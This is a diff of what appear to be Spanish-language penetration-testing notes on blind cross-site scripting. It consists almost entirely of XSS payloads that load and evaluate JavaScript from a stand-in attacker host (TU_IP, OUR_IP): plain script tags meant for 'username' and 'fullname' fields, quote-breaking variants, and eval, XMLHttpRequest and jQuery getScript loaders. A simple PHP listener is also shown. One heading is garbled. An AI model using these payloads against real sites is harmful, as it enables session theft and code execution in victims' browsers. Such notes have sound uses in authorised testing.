@@ -81,13 +81,17 @@ cd /tmp/tmpserver
 sudo php -S 0.0.0.0:8000
 ```
 
-<pre class="language-javascript"><code class="lang-javascript">&#x3C;script src="http://TU_IP:8000/username">&#x3C;/script>  ← lo pones en el campo 'username'
-&#x3C;script src="http://TU_IP:8000/fullname">&#x3C;/script>  ← lo pones en el campo 'fullname'
-## Test anothers payloads
-<strong>&#x3C;script src=http://TU_IP/username>&#x3C;/script>
-</strong>'>&#x3C;script src=http://TU_IP/username>&#x3C;/script>
-">&#x3C;script src=http://TU_IP/username>&#x3C;/script>
-</code></pre>
+```javascript
+<script src="http://TU_IP:8000/username"></script>  ← lo pones en el campo 'username'
+<script src="http://TU_IP:8000/fullname"></script>  ← lo pones en el campo 'fullname'
+## Test anothers payloadsallthethings -->
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
 
 >
 
